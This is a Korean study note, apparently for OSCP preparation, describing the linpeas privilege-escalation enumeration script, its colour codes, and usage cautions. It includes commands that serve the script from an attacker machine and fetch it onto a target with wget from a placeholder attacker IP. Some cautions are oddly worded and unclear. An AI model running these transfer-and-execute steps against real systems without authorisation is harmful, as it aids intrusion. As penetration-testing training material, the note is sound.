# linpeas (PEASS-ng)

## 개요

`linpeas.sh`는 Linux 권한 상승 자동 진단 스크립트다.
OSCP 시험에서는 열거(Enumeration) 용도로만 사용하고, 자동 공격은 하지 않는다.

## 설치 및 실행

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh

# 공격자 PC에서 서버로 전송
python3 -m http.server 80
# (대상) wget http://<공격자_IP>/linpeas.sh

# 실행 (열거 결과를 파일로 남긴다)
/tmp/linpeas.sh > /tmp/linpeas_result.txt
```

## 사용 시 주의

- `find / -writable -type d`처럼 타깃 전체를 터널링하지 않는다.
- 실행 권한이 필요한 명령은 sudo로 실행한다.
- 결과에서 직접 분석해야 하는 항목만 골라 공격한다. 자동 공격은 하지 않는다.

## 빨간색 표시 해석

| 표시 | 의미 |
|------|------|
| 🔴 Red | 거의 확실한 권한 상승 벡터 |
| 🟡 Yellow | 주의. 직접 분석 필요 |
| 🔵 Blue | 참고 (공격보다는 문서화) |

- 빨간색이 아니어도 SUID/SGID가 붙은 사용자 추가 파일은 직접 분석한다.
- 이 문서의 나머지 내용은 [privilege_escalation_overview.md](../privilege_escalation_overview.md) 등이 계승한다.

## 참고

- Windows에 대응하는 도구는 `winPEAS`(`04-privilege-escalation/windows/privileges/04-scenarios-tools.md`의 자동 열거로 다룬다).
- 이 자동화 도구는 여기서 "열거"로만 사용한다.
- 모든 시도는 합법적인 대상(본인 소유·허가받은 시스템)에서만 실행한다.
